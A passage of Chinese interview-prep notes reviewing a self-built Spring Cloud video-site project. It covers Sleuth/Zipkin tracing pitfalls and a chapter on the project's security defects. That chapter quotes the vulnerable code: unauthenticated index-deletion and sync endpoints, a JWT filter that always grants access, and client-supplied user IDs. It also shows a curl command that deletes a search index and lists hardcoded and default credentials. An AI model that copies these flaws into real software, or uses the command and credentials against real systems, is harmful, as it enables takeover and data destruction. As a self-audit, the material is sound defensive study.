     - **Span（跨度）**：链路中的**一个工作单元**（一次 HTTP 调用、一次 DB 查询、一次方法调用），有自己的 **spanId**，并记录 **parentSpanId** 形成树状结构；
     - **Span 树**：根 span 是入口请求，子 span 是它触发的下游调用。
  2. **传递机制**（**核心**）：
     - Sleuth 在**请求入口**（如 `DispatcherServlet` 的 Filter）创建或继承 trace 上下文，放进 **`ThreadLocal`**（通过 `CurrentTraceContext` 实现，Slf4j 集成后还能写进 **MDC**，这样日志格式里就能打 traceId）；
     - **跨服务的传递靠 HTTP header**（B3 Propagation 标准）：`X-B3-TraceId`、`X-B3-SpanId`、`X-B3-ParentSpanId`、`X-B3-Sampled`；
     - **Feign 集成**：Sleuth 自动给 `Feign` 加了 `FeignRequestInterceptor`，**出站请求会自动带上这些 header**——所以**我项目里 3 个 Feign 客户端不需要任何代码改动就自动透传了 traceId**；
     - **下游接收**：下游服务的 Sleuth 从 header 里读 traceId，**继承而不是新建**，形成同一个 trace。
  3. **上报流程**：每个 span 结束时，通过 `Reporter`（`sender.type: web` 对应 `ZipkinRestTemplateSender`）**异步上报**到 Zipkin 的 `/api/v2/spans`；Zipkin 存储后**聚合展示**。
  4. **采样**：`probability` 决定「多少比例的请求会被记录」。**采样决策在链路的第一个服务做出（`X-B3-Sampled`）**，后续服务**继承这个决定**——这保证了一条链路「要么全采要么全不采」，不会出现半个链路。
  - **项目实证**：因为 Sleuth 自动集成 Feign，所以 `VideoClient.getVideo`、`SendNoticeClient.sendDBChangeNotice` 这些调用**在 Zipkin 上会自动出现 span**，业务代码零侵入。

**Q3 [进阶] 为什么链路追踪对异步/消息不友好？**

- **考点**：**这题是本章最有深度的追问，也直击我项目的真实缺陷。**

- **答**：
  - **根本原因**：Sleuth 的 trace 上下文放在 **`ThreadLocal`** 里，而 `ThreadLocal` 是**线程绑定**的。**一旦工作切换到另一个线程，上下文就丢了。**
  - **在项目里具体断在哪些地方**（**这是回答的价值所在**）：
    1. **🔴 大模型调用（OkHttp 回调线程）**：
       ```java
       client.newWebSocket(request, this);      // OkHttp 自己的读线程回调 onMessage
       ```
       `BigModelHandler.onMessage` 运行在 **OkHttp 的 `OkHttp ws://...` 读线程**上，**不是发起请求的线程**。所以「chat 服务 → 星火」这一段在 Zipkin 上**很可能是断的**（或者成为一个孤立的 trace）。
    2. **🔴 RocketMQ 生产/消费**：
       ```java
       rocketMQTemplate.asyncSend(topic, json, callback);   // 异步发送
       ```
       - **生产端**：`asyncSend` 的回调在 MQ 客户端的线程上执行；
       - **消费端**：`@RocketMQMessageListener` 的 `onMessage` 在**消费者线程池**里执行；
       - **消息本身没有携带 trace header**（Sleuth 不会自动往 RocketMQ 消息里塞 `X-B3-*`），所以**消费端会开一个全新的 trace**，和生产端的 trace **完全断开**。
       - **修法**：手动传递 traceId——
         ```java
         // 生产端：把当前 traceId 塞进消息的 userProperty 或 body
         String traceId = tracer.currentSpan().context().traceId();
         rocketMQTemplate.asyncSend(topic, MessageBuilder.withPayload(json)
                 .setHeader("X-B3-TraceId", traceId).build(), callback);
         // 消费端：取出并注入上下文
         Span span = tracer.nextSpan().name("mq-consume")
                 .tag("traceId", msg.getProperty("X-B3-TraceId")).start();
         try (Tracer.SpanInScope ws = tracer.withSpanInScope(span)) { ... } finally { span.end(); }
         ```
       - 或者用 **RocketMQ 的消息轨迹（Message Trace）**功能，它有独立于 Sleuth 的追踪机制。
    3. **🔴 `@Async` / `CompletableFuture`**：我项目里用了大量 `CompletableFuture.runAsync(...)`（`UploadAndEditServiceImpl`、`LikeServiceImpl`）——**默认的 `ForkJoinPool.commonPool` 不会继承 ThreadLocal**，所以这些异步任务**脱离原 trace**。Sleuth 提供了 `LazyTraceExecutor`/`TraceableExecutorService` 包装器来解决：
         ```java
         Executor traced = new LazyTraceExecutor(beanFactory, myExecutor);
         ```
    4. **🔴 线程池**：MQ 消费线程、Tomcat 线程、定时任务线程——**任何跨线程边界的场景都需要手动传递上下文**。
  - **正确理解**：**「Sleuth 解决的是『同步阻塞调用链』的追踪，对『异步与消息驱动』的链路，它需要逐点手动适配。」** 这也是为什么现代方案（如 **OpenTelemetry**）在上下文传播上做得更彻底——它定义了统一的 **Context Propagation** 规范，并提供了 HTTP/gRPC/MQ 的标准 instrument。
  - **项目实证分享**：真要测 AIGC 链路的性能，**不能只靠 Zipkin**，必须做**业务埋点**：首帧延迟（TTFT）、完整回答耗时、单轮 token 数、失败率/错误码分布——这些应该用 Micrometer 打到 Prometheus + Grafana。

**Q4 [深挖] 你项目里的 Sleuth 配置有问题吗？**

- **考点**：**这题非常隐蔽，答出来说明你真读过自己的配置。**

- **答**：
  - **`probability: 1` 实际上没生效，真实采样率是默认的 0.1。**
  - **原因：配置层级写错了。** 看 yml：
    ```yaml
    spring:
      zipkin:
        base-url: http://localhost:9411
        sender:
          type: web
        sleuth:                    # ← ★ sleuth 被写成了 zipkin 的子节点！
          sampler:
            probability: 1
    ```
    **正确的层级应该是**：
    ```yaml
    spring:
      zipkin:
        base-url: http://localhost:9411
        sender:
          type: web
      sleuth:                      # ← ★ 与 zipkin 平级，都在 spring 下
        sampler:
          probability: 1
    ```
  - **后果**：`spring.zipkin.sleuth.sampler.probability` 这个路径**在 Spring 的配置元数据里不存在**，会被**静默忽略**（Spring Boot 对未知配置项默认不报错，只会忽略）。所以 Sleuth 用的是**默认采样率 0.1**——**只有 10% 的请求被追踪**。
    - **这个错误的实际影响**：调试时「为什么这次请求在 Zipkin 上看不到」——因为**90% 的概率它就是被采样丢弃了**。而 `1` 写在注释里（`# sleuth 日志记录采样率，1为100%`），说明作者的意图确实是 100%，但**配置没生效他并不知道**。
  - **这题的延伸价值（要主动讲）**：
    1. **如何发现这类问题**：Spring Boot 可以开 `--debug` 或者引入 `spring-boot-configuration-processor` 来生成配置元数据，IDE 里对未知配置项会有提示；更实用的做法是**启动后打印关键配置的实际值**（`@EventListener(ApplicationReadyEvent.class)` 里打 `Sampler` Bean 的实际采样率），或者接 **Actuator 的 `/configprops` 端点**直接看绑定结果。
    2. **`probability: 1` 在生产也是错的**（**这个观点很重要**）：
       - **开发环境**：100% 采样好，能追踪到每一次请求；
       - **生产环境**：**100% 采样会把 Zipkin 存储和网络带宽打爆**。我的配置里 Zipkin 用的是**内存存储**（`openzipkin/zipkin:2.24.3` 默认 `STORAGE_TYPE=mem`，我在 `docker-compose.yml` 里也没看到覆盖），**内存存储重启即丢、且有容量上限**——100% 采样下高 QPS 时 Zipkin 会迅速 OOM 或丢弃数据。
       - **生产正确做法**：① `probability: 0.1` 之类的比例采样；② **慢请求优先采样**（只在耗时超阈值时强制上报，`Sampler` 自定义或 `RateLimitingSampler`）；③ Zipkin 存储换成 **Elasticsearch**（`STORAGE_TYPE=elasticsearch`，这个项目已经有 ES 了，正好复用）；④ 或改用**尾部采样（tail-based sampling）**——先收集全部、再按策略决定留哪些（OpenTelemetry Collector 支持）。
    3. **`sender.type: web`**：表示通过 **HTTP** 上报（`ZipkinRestTemplateSender`）。另一种是 `kafka`/`rabbit`（异步，对业务影响更小）。`web` 在高 QPS 下会产生大量 HTTP 请求，**官方推荐生产用 MQ 上报**。
    4. **依赖版本代差**：`java/common/pom.xml:81` 把 `spring-cloud-starter-zipkin` **钉在了 2.2.2.RELEASE**——这是 **SpringCloud Hoxton（2.2.x）时代**的版本，而项目用的是 **SpringCloud 2021.0.4**。虽然它被父 POM 的 `dependencyManagement` 统一到了 `3.1.4`（`java/pom.xml:163-167` 声明了 `spring-cloud-starter-zipkin` 3.1.4），但**依赖声明版本与 pom 里写的版本号不一致**，属于容易引起误解和冲突的写法，应该统一。

**Q5 [进阶] 采样率怎么选？100% 好吗？**

- **答**（**这题我上面 Q4 已经埋了，这里系统回答**）：
  - **采样率的本质是「成本 vs 可观测性」的权衡**：
    ```
    成本 = 采样率 × QPS × 单链路 span 数 × 单个 span 大小
    ```
    假设 QPS=1000、每链路 10 个 span、每 span 1KB，100% 采样就是 `1000 × 10KB = 10MB/s = 864GB/天` —— **这个量级必须用 ES 集群 + 采样才能扛住**。
  - **按环境分档**：
    | 环境 | 建议采样率 | 理由 |
    |---|---|---|
    | 本地开发 | **100%** | 要看每一次请求，量小 |
    | 测试/预发 | 100% 或 50% | 便于验证链路正确性 |
    | **生产** | **1%~10%** | 成本可控，统计意义足够（样本够大） |
    | **生产 + 慢请求** | **1% 基础 + 100% 慢请求** | 可选，最实用 |
  - **几种采样器**：
    | 采样器 | 行为 | 适用 |
    |---|---|---|
    | `ProbabilityBasedSampler` | 按比例随机 | **最常用** |
    | `RateLimitingSampler` | **每秒最多 N 条**（限流式） | **高 QPS 下比概率更可控**（不会因为流量翻倍而采样量翻倍） |
    | `CountingSampler` | 每 N 条采 1 条 | 简单 |
    | **慢请求优先** | 默认不采，超阈值强制采 | **性价比最高**：正常请求不需要看链路，慢的才需要 |
  - **加分句**：**「采样率不是『越低越省钱』——采样太低会导致『出问题时恰好没采到』。所以我更倾向『低基础采样 + 异常/慢请求强制采样』的组合：正常流量采 1% 用来做容量趋势，一旦 P99 超标或出现错误就强制记录这一条，保证排查时一定有数据。」**
  - **还要考虑「采样决策的一致性」**：Sleuth 把采样决策放在 `X-B3-Sampled` 里**随请求传递**，所以一条链路要么全采要么全不采（**这是我项目里的正确行为**，不需要额外配置）。

**Q6 [进阶] Zipkin 的存储怎么选？项目里用的什么？**

- **答**：
  - **项目里用的是默认的内存存储**（`openzipkin/zipkin:2.24.3` 镜像，docker-compose 里没有 `STORAGE_TYPE` 环境变量）。
    - **内存存储的问题**：① **重启即丢**；② **有容量上限**（内存里保留最近 N 个 span，超出就丢）；③ **不能做长期分析**。
    - **所以它只适合本地开发和演示**，不能上生产。
  - **Zipkin 支持的存储后端**：
    | 存储 | 特点 | 适用 |
    |---|---|---|
    | `mem`（内存） | 快、易丢、容量小 | 本地开发 |
    | **`elasticsearch`** | **可扩展、支持复杂查询、能长期保留** | **生产首选（尤其项目里已有 ES）** |
    | `mysql` | 简单，但**写入压力大、查询慢**（Zipkin 的 schema 索引设计一般） | 小规模 |
    | `cassandra` | 写入能力强，运维复杂 | 大规模 |
  - **⚠️ 但这里有个很重要的工程判断**（**主动提这一点非常加分**）：
    > **「不要把 Zipkin 的 trace 存到业务 ES 集群里。」**
    - 理由：① **容量冲击**——链路数据的量级远大于业务数据，会把业务索引挤掉（分片、磁盘、内存都被抢）；② **写入竞争**——Zipkin 是高写入负载，会拖慢业务查询；③ **故障域耦合**——ES 挂了既影响搜索又影响追踪，**可观测性系统挂了不该影响业务**（这是可观测性的基本原则）。
    - **正确做法**：**独立的 ES 实例/集群**给 Zipkin 用，或者用 **OpenTelemetry Collector + 独立后端**（Jaeger/Tempo），**物理隔离**业务和可观测性数据。
    - **加分句**：**「可观测性系统应该被当作『旁路』设计——它挂掉不能影响业务，它的容量增长不能挤占业务资源。所以我不会让 Zipkin 和业务搜索共用 ES 集群。」**

**Q7 [进阶] Sleuth 和 Zipkin 现在还用吗？有什么替代方案？**

- **答**（**这题考技术视野，2024 年之后的面试很常问**）：
  - **现状**：**Spring Cloud Sleuth 已经进入维护末期**——在 **SpringBoot 3 / SpringCloud 2022.0（Kilburn）之后，Sleuth 被移除，官方推荐迁移到 Micrometer Tracing**。
    - **迁移映射**：
      | Sleuth 时代 | Micrometer 时代 |
      |---|---|
      | `spring-cloud-starter-sleuth` | `micrometer-tracing-bridge-brave`（Bridge） |
      | `spring-cloud-starter-zipkin` | `zipkin-reporter-brave` |
      | `spring.sleuth.sampler.probability` | `management.tracing.sampling.probability` |
      | `@NewSpan` 等注解 | Micrometer 的 `@Observed` / `Observation` API |
    - **为什么换**：Micrometer 的 **Observation API** 把「指标（Metrics）」和「链路（Tracing）」统一成一个抽象——**一次埋点同时产出 metric 和 span**，避免了 Sleuth（只管链路）+ Micrometer（只管指标）两套 API 并存的问题。**这正好解决了我项目里「链路有了但指标没有」的缺口。**
  - **行业趋势：OpenTelemetry（OTel）**
    - **OTel 是 CNCF 的开放标准**，目标是**统一 traces / metrics / logs 三种遥测数据的采集与传输协议**（OTLP）；
    - **相比 Zipkin/Sleuth 的优势**：① **厂商中立**（可以随意换后端：Jaeger、Tempo、Datadog、SkyWalking……）；② **自动埋点覆盖广**（Java Agent 零代码侵入，支持主流框架和中间件）；③ **上下文传播更完善**（对 MQ、异步线程有标准支持，正好解决我项目里 MQ 链路断掉的问题）；④ **社区最活跃**。
    - **代价**：① Java Agent 方式有性能开销和版本兼容风险；② 概念多（Collector、Processor、Exporter、SDK/Agent 分层），学习曲线陡；③ 后端通常要另外部署（Jaeger/Tempo）。
  - **国内常用替代**：**SkyWalking**——国内社区活跃，**Java Agent 零侵入**、自带 UI、支持链路 + 指标 + 拓扑 + 告警一体化，**很多国内公司用它替代 Zipkin**。
  - **我项目的情况与选择**：
    - 当前是 **SpringBoot 2.6 + SpringCloud 2021**，**Sleuth 在这个版本仍然可用**（是我引入时正确的选择）；
    - 但如果要升级到 **SpringBoot 3**，**Sleuth 必须换成 Micrometer Tracing**，否则直接跑不起来（Sleuth 依赖 `javax.*`，Boot 3 是 `jakarta.*`）；
    - **如果现在重做，我会选 OpenTelemetry**：因为它能一次性解决我项目的三个缺口——**链路（已有但 MQ 段断了）、指标（完全缺失）、以后可能需要的日志关联**，而且标准化的上下文传播能自动覆盖 RocketMQ 和异步线程池。**在 SpringBoot 3 升级时一并迁到 OTel + Micrometer，是最经济的时机。**

### 21.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **`sleuth.sampler` 配置层级错，`probability: 1` 未生效（实际 0.1）** | 6 个服务的 `application.yml` | 🟠 高 | 移到 `spring.sleuth.sampler.probability` |
| **生产用 100% 采样（若修复后会）→ 打爆 Zipkin** | 同上 | 🟠 高 | 生产 1%-10% + 慢请求优先 |
| **Zipkin 用内存存储，重启即丢** | `docker-compose.yml` 未设 `STORAGE_TYPE` | 🟠 高 | 换 ES（**独立集群**）或 Cassandra |
| **MQ 链路 trace 断裂**（消息不带 B3 header） | `SendNoticeServiceImpl` / 各 Consumer | 🟠 高 | 手动传递 traceId 或用 MQ 消息轨迹 |
| **OkHttp 回调线程脱离 trace**（星火链路断裂） | `BigModelHandler.onMessage` | 🟠 高 | 手动注入 trace 上下文 |
| **`CompletableFuture.runAsync` 不继承 ThreadLocal** | `UploadAndEditServiceImpl`、`LikeServiceImpl` | 🟠 高 | `LazyTraceExecutor` 包装线程池 |
| `sender.type: web` 高 QPS 下 HTTP 上报压力大 | 各 yml | 🟡 中 | 生产用 MQ 上报 |
| `starter-zipkin` 版本声明与父 POM 不一致（2.2.2 vs 3.1.4） | `common/pom.xml:81` | 🟡 中 | 统一版本 |
| **完全缺失 Metrics**（无 Micrometer/Prometheus） | 无依赖 | 🟠 高 | 加 Micrometer + Prometheus + Grafana |
| 无 traceId 打进日志格式 | `logback-spring.xml` | 🟡 中 | pattern 里加 `[%X{traceId},%X{spanId}]` |
| 未考虑 Boot 3 迁移（Sleuth 将被移除） | 依赖选型 | 🟡 中 | 规划迁 Micrometer Tracing / OTel |

---

## 第 22 章 ⚠️ 安全缺陷专项：必须主动交代的高危问题

**这一章是全篇优先级最高的一章。** 我按「真实可利用性」把散落在各章的严重问题集中列出。**面试时至少要在「你有什么不足」环节主动讲前 3 条**——因为前三类都是**面试官一看代码/一查接口就能验证**的，主动讲是加分，被查出来是诚信问题。

### 🔴 级别一：可直接导致「越权 / 服务瘫痪」

**S1. `GET /search/test` —— 无鉴权，任何人可触发全量 MySQL→ES 同步**

```java
// search/controller/SearchController.java:30-34
@GetMapping("/test")                        // ← 无 @ApiIgnore、无鉴权、无任何校验
public Boolean test() throws Exception {
    mysqlToEsHandler.mysqlToEsHandler();    // ← 直接执行定时任务的全量同步逻辑！
    return true;
}
```
- **它做错了什么**：本应由 XXL-Job 调度中心（带 `accessToken` 校验）触发的任务，**被直接暴露成了公开 HTTP 接口**。
- **被利用的后果**：① **资源耗尽**——全量同步会**逐条** `client.index()` 读全表 + 写 ES（见第 20 章），重复调用会**打满 MySQL 和 ES**；② 无需任何凭据，**任何人都能反复触发**。
- **修法**：**直接删掉这个方法**。定时任务只能由调度中心触发；调试需要的话加 `@Profile("dev")` + 内网限制 + 鉴权。
- **面试话术**：「这是我最优先要删的接口——我把调度任务暴露成了无鉴权 HTTP 接口，任何人都能触发全量同步，这是典型的『调试代码泄漏到生产』。」

**S2. `POST /search/deleteIndex/{indexName}` —— 无鉴权，任意索引可被删除**

```java
// SearchController.java:84-89
@PostMapping("/deleteIndex/{indexName}")    // ← indexName 由路径参数直接传入！
@ApiIgnore                                    // ← 只隐藏文档，不提供任何保护
public void deleteIndex(@PathVariable String indexName) throws IOException {
    searchService.deleteIndex(indexName);     // ← 直接删
}
```
- **被利用的后果**：`curl -X POST '.../search/deleteIndex/video'` **就能把整个 `video` 搜索索引删掉**，全站搜索立刻失效。
- **修法**：删除接口，或严格限制为运维操作（独立管理端 + 鉴权 + 审计 + 二次确认）。`createIndex` 同理（而且它**只写 `properties.type`、无字段校验、吞异常恒返回 true**，能建出错误索引）。

**S3. 网关鉴权恒真 —— 所有接口等于没有鉴权**

```java
// gateway/filter/JwtAuthorizationFilter.java:52-61
SimpleGrantedAuthority authority = new SimpleGrantedAuthority("role:user");
Authentication authentication = new UsernamePasswordAuthenticationToken("username", "password", singletonList(authority));
// ← JWT 解析逻辑（取 header、getClaimsFromToken）全被注释掉了，无条件赋予 role:user
```
配合 `SecurityConfig:45` 的 `.anyExchange().hasAuthority("role:user")`，**授权判定恒为真**。详见第 2 章 Q4。

### 🔴 级别二：身份可伪造

**S4. WebSocket 身份由前端传 `userId` —— 可冒充任意用户**

```java
// chat/handler/WebSocketHandler.java:86-88
String userId = json.get(USER_IDENTITY).getAsString();     // ← 信任客户端
USERID_TO_SESSIONID_MAP.put(userId, sessionId);
```
**改一个 `userId` 就能以他人身份发消息、读他人的 AI 对话上下文、把真实用户顶下线**。详见第 17 章 Q3。

**S5. 业务层全链路信任前端传的 `userId`**

`LikeServiceImpl`（`likeRequest.getUserId()`）、`PlayServiceImpl`、`ChatServiceImpl` 等**几乎所有需要身份的接口，都是从前端参数取 `userId`**。配合 S3（网关不鉴权），**任何人都能以他人身份点赞、收藏、删视频、发消息**。
- **修法**：网关解析 JWT 后通过 **`X-User-Id` 请求头**下传，**下游一律从 header 取身份**，彻底忽略 body/query 里的 `userId`。

**S6. 密钥全部硬编码进 Git**

| 密钥 | 位置 | 风险 |
|---|---|---|
| JWT 签名密钥 `"labilibili_key"`（13 字节，**HS512 要求 ≥64 字节**） | `gateway/constant/Constant.java:34` | **可直接伪造任意用户的 token**（见第 8 章 Q4） |
| 星火 `appId/apiKey/apiSecret`（现为 `"xxx"` 占位） | `chat/constant/Constant.java:17-19` | 泄漏后 API 被盗刷（**真金白银**） |
| MinIO `minioadmin/minioadmin` | `video`/`user_center` 的 `application.yml` | **出厂默认凭据**，可读写删所有对象 |
| MySQL `root/user` | 所有 `application.yml` | 数据库超级权限 |
| XXL-Job `accessToken: default_token` | `search/application.yml` | 任何人可伪造调度请求 |
| 邮箱 SMTP 密码 | `gateway/application-dev.yml` | 账号被盗用发垃圾邮件 |

- **修法**：全部外置到**环境变量 / Nacos 加密配置 / 密钥管理服务**；**已进过 git 历史的一律轮换**（删文件无效）；数据库改**最小权限专用账号**（不给 root）。

### 🔴 级别三：认证链路自身缺陷

**S7. 图形验证码把答案返回给前端 —— 等于验证码不存在**

```java
// gateway/service/impl/LoginServiceImpl.java:196-197
captchaMap.put(CAPTCHA_IMAGE, captcha);        // 图片
captchaMap.put(CAPTCHA_CODE,  code.toString()); // ← ★ 明文答案也一起返回了！
```
**脚本直接读响应里的 `code` 字段即可，图形验证码完全失效**。另外：验证码 key **无 TTL**、校验成功后**不删除**（可重复使用）、6 位数字短信验证码**无错误次数限制**（可爆破）。详见第 6 章 Q2。

**S8. 注册/改密流程的认证缺陷**

| 问题 | 位置 | 后果 |
|---|---|---|
| `passwordEncoder.encode()` **返回值未赋值** | `LoginServiceImpl:107,149` | 注册用户密码**以明文入库**（或为 null） |
| 用 `matches(phoneNumber, user.getPhoneNumber())` 校验**手机号** | `LoginServiceImpl:101,141` | 手机号从未加密，`matches` 恒 false → **该分支永不生效** |
| **改密接口无任何身份校验** | `RemakePasswordServiceImpl:21-31` | **任何人可改任意账号的密码** |
| `id` 为 null 时仍签发 token | `LoginServiceImpl:121,163` | 逻辑漏洞 |
| 登录接口 `/login/**` **不在 permitAll 白名单里** | `SecurityConfig:33-45` | 目前靠「鉴权恒真」侥幸可用；**修鉴权时必须同步加白名单，否则系统锁死** |

### 🔴 级别四：可用性灾难

**S9. `onFailure` 里 `System.exit(0)` —— 外部依赖抖动即杀进程**

```java
// chat/handler/BigModelHandler.java:163-166（PPTHandler 同）
if (101 != code) {
    System.out.println("connection failed");
    System.exit(0);        // ← ★ 星火一次抖动 → 整个 chat 服务 JVM 退出
}
```
**星火侧的网络超时、429 限流、鉴权失败，都会让整个 chat 服务进程消失**（连带私聊功能一起挂）。这是**全项目优先级最高的单点缺陷**。

### 🔴 级别五：容器/配置层安全

| 问题 | 位置 | 说明 |
|---|---|---|
| `setAllowedOrigins("*")` | `chat/config/WebSocketConfig.java:23` | 跨站 WebSocket 劫持（CSWSH） |
| `@CrossOrigin(value = "*")` | `SearchController.java:24` | 允许任意域跨域 |
| Swagger 无生产开关 | 各 `Knife4jConfiguration` | 生产暴露全部接口结构 |
| `indexName` 作为路径参数直接使用 | `SearchController:84` | 任意索引可删 |
| ES 无认证 | `search` 未使用 `username/password` | 任何人都能读写删索引 |
| MinIO bucket 匿名可读 | 由「DB 存绝对 URL 直连」的方式决定 | 视频可被任意盗链下载 |
| XXL-Job admin 默认口令 `admin/123456` | 部署 | 需修改 + 限制访问网段 |

### 面试时的「安全专项」标准回答模板

> 「这个项目我复盘时最不满意的是安全这条线，我把它分五类：
>
> **第一类是「接口暴露」**——我把调试用的 `GET /search/test`（能触发全量同步）和 `POST /search/deleteIndex/{indexName}`（能删任意索引）都留在了代码里，而且没有鉴权。这两个应该直接删掉。
>
> **第二类是「鉴权看起来有、实际没有」**——网关的 JWT 过滤器里，解析 token 的代码被注释掉了，改成了无条件赋予 `role:user`，这让 `hasAuthority` 恒真；同时 WebSocket 那条路完全绕过网关，身份是前端传的 `userId`；业务层也全链路信任前端传的 `userId`。**所以严格说，这个项目的鉴权体系是失效的。** 修法是三步：网关真正解析 JWT 并下传 `X-User-Id`、WebSocket 在握手阶段校验 JWT 并绑定到 `session.getAttributes()`、下游服务只认 header 不认参数。
>
> **第三类是「密钥管理」**——JWT 密钥、星火 API Key、MinIO 默认凭据、数据库 root 密码、XXL-Job token、SMTP 密码全部明文在 Git 里。已进过历史的必须轮换，同时全部外置到 Nacos 加密配置或环境变量。
>
> **第四类是「认证逻辑本身的 bug」**——验证码答案随响应返回前端、验证码无 TTL 且校验后不删、注册时 `encode()` 返回值没赋值（密码明文入库）、改密接口无身份校验。
>
> **第五类是「可用性」**——`onFailure` 里的 `System.exit(0)`，星火一次抖动就能把整个服务杀掉。
>
> 整改优先级我按这个顺序：**先删暴露的接口、再修鉴权（同时必须补 `/login/**` 白名单，否则会把系统锁死）、再轮换密钥、最后是具体 bug**。理由是前三类任何一个被利用都是『数据泄露 / 服务不可用』级别，而验证码、改密这些虽然也严重，但影响面更局部。」

---

## 第 23 章 技术栈总览速查表（面试前 10 分钟速过）

### 23.1 每个技术栈「一句话定位 + 项目落点 + 必答问题」

| # | 技术栈 | **一句话定位** | 核心落点 | 必答问题 |
|---|---|---|---|---|
| 1 | **SpringBoot** | 6 个服务的统一脚手架与运行底座 | 父 POM、`@ConditionalOnProperty`、自动配置 | 自动配置原理 / 配置优先级 |
| 2 | **Security** | **仅网关生效**的粗粒度鉴权 + BCrypt | `SecurityWebFilterChain`、`addFilterAt`、白名单 | 自定义过滤器如何挂进链？**（鉴权恒真）** |
| 3 | **Nacos** | 服务注册与发现（**⚠️ 依赖未引入，实际没跑**） | 各服务 yml 的 `discovery.server-addr` | **主动交代 3.1.1 节** / AP vs CP |
| 4 | **OpenFeign** | 跨服务调用（3 个 Client 收敛所有远程调用） | `SendNoticeClient`/`VideoClient`/`SearchClient` | 原理 / 超时 / **传 MultipartFile 的坑** |
| 5 | **Gateway** | 唯一入口：路由 + 鉴权 + **WebSocket 转发** | 6 条路由、`ws://` 路由、`lb://` 缺失 | **怎么转发 WebSocket** / 三大概念 |
| 6 | **Redis** | **不是缓存**，是共享状态 + **ES 增量队列** | 验证码、5 个同步 List、`encode-count` | key 设计 / **`encode-count` 的 4 个 bug** |
| 7 | **Elasticsearch** | 搜索与推荐引擎（3 个索引） | `multi_match(MOST_FIELDS)`、`moreLikeThis`、`minScore` | **无 IK/无 mapping** / 深分页 / 高亮未在 ES 实现 |
| 8 | **RocketMQ** | 异步解耦主动脉（**5 个 topic**） | `video-encode`/`mysqlToEs`/`like`/`comment`/`dynamic` | 顺序消息 / 不丢消息 / **幂等（无唯一索引）** |
| 9 | **MinIO** | 文件存储 + **分片上传链路** | `composeObject`、`uploadPartMap` 断点续传 | **与 S3 官方分片上传的区别** / 状态存内存的问题 |
| 10 | **MyBatis-Plus** | 单表 CRUD 主力（**约 90% 的 DB 操作**） | `BaseMapper`、`LambdaQueryWrapper`、`MetaObjectHandler` | 自动填充 / **`updateById` 的坑** / **`@Transactional` 失效** |
| 11 | **MyBatis-Plus-Join** | 不写 SQL 做多表 join | `MPJLambdaWrapper` + `selectJoinOne/List/Count` | 为什么需要它 / 与手写 SQL 并存怎么统一 / **12.4 无索引专题** |
| 12 | **Druid** | 连接池（**⚠️ 参数一个都没配**） | `type: DruidDataSource` 一行 | 核心参数 / **`maxActive` 默认 8** / **`maxWait` 无限等待** |
| 13 | **Swagger/Knife4j** | 接口文档（**Swagger 2 + Springfox**） | 各模块 `Knife4jConfiguration`、`@ApiIgnore` 隐藏内部接口 | Swagger 2 vs OpenAPI 3 / **生产必须关** |
| 14 | **Gson** | **WebSocket 链路专用的 JSON 工具**（给非 Spring Bean 用） | `WebSocketHandler.gson`、`BigModelHandler` 流式帧解析 | **为什么三套 JSON 库** / `@type` 污染 ES |
| 15 | **Hutool** | 工具类兜底（IO / Base64 / 文件类型） | `IoUtil.readBytes`、`Base64.encode`、`FileTypeUtil` | 为什么用它 / **恶意文件校验被注释掉** |
| 16 | **WebSocket** | 私聊 + AIGC 流式的唯一长通道 | `WebSocketHandler`、两张映射表、4 种 `type` | **身份由前端传（致命）** / 无法水平扩容 / **`@Async` 没生效** |
| 17 | **讯飞星火** | AI 能力提供方（**3 套 API**） | HMAC-SHA256 签名、`v3.5/chat`、`v2.1/tti`、AIPPT | **签名五步** / GET vs POST / **三份重复实现** |
| 18 | **JAVE** | FFmpeg 的 Java 封装：截帧 / 时长 / 转码 | `ScreenExtractor`、`Encoder.encode` | 为什么转码 / **临时文件泄漏** / **同步阻塞** / **简历写了压缩去水印但没实现** |
| 19 | **XXL-Job** | 调度中枢，驱动 **MySQL→ES 同步最后一环** | `@XxlJob("mysqlToEs")`、`XxlJobSpringExecutor` | **cron 不在代码里** / 与 `@Scheduled` 的区别 / **`range`+`delete` 非原子** |
| 20 | **Sleuth** | 生成与传递 traceId（**配置层级写错**） | 各服务 yml、Feign 自动透传 | 原理 / **对异步 + MQ 不友好** / 采样率怎么选 |
| 21 | **Zipkin** | 链路存储与可视化（**内存存储**） | `base-url`、`sender.type: web` | 存储选型 / **不要把 trace 存业务 ES** / **Sleuth 已被 Micrometer Tracing 取代** |
| 附 | **MySQL** | 业务库（**21 张表零索引零约束**） | `01-schema.sql`、`02-triggers.sql`（7 个触发器） | 索引设计 / 触发器维护计数的取舍 / **无唯一约束的幂等风险** |

### 23.2 「一句话介绍项目」的三个版本

**30 秒版（自我介绍用）**

> 「我做的是一个仿 B 站的微服务项目，按业务拆了 6 个服务——网关、用户中心、视频、通知、搜索、聊天，用 SpringCloud Alibaba 全家桶。中间件上，RocketMQ 承担转码、通知、数据同步三类异步链路，ES 提供聚合搜索和推荐，MinIO 存视频，XXL-Job 定时做 MySQL 到 ES 的同步，Redis 既做验证码也做 ES 增量同步的缓冲队列。业务上最有讲头的是分片上传 + 异步转码链路，以及基于 RocketMQ + Redis + XXL-Job 的最终一致性同步方案。」

**2 分钟版（技术面开场）**

在 30 秒版基础上补三段：
1. **架构约束**：为什么这么拆服务（按业务域而非按技术分层）；微服务带来的代价（分布式事务、链路追踪、数据一致性）。
2. **三个技术亮点**（选你最熟的讲透）：① 分片上传 + 断点续传 + `composeObject` 合并；② MySQL→ES 的最终一致（MQ + Redis List + 定时批量 + `docAsUpsert` 幂等）；③ WebSocket 单端点跑私聊和 AIGC 流式。
3. **一个主动暴露的缺陷 + 重构思路**（**这一句是分水岭**）：
   > 「这个项目我复盘时发现最该修的是**鉴权**——网关的 JWT 过滤器实际上没有解析 token，只无条件盖了个 `role:user`，导致授权规则恒真；同时 WebSocket 这条路的身份是前端传的 `userId`，完全绕过了网关。所以在这个项目里，**网关鉴权其实等于没有**。我的整改顺序是：安全底线（握手鉴权 + Origin 白名单 + 移除 `System.exit`）→ 状态外置（AI 上下文和上传状态迁 Redis，支持多实例）→ 资源治理（全局单例 OkHttpClient、真正打开 `@EnableAsync`、PPT 生成并行化）→ 可维护性（抽公共签名工具、去 `@type` 改用强类型 DTO）。」

### 23.3 被问「这项目有什么不足」时的标准答案

**按这个顺序讲**（从全局到局部，每条都带「怎么改」）：

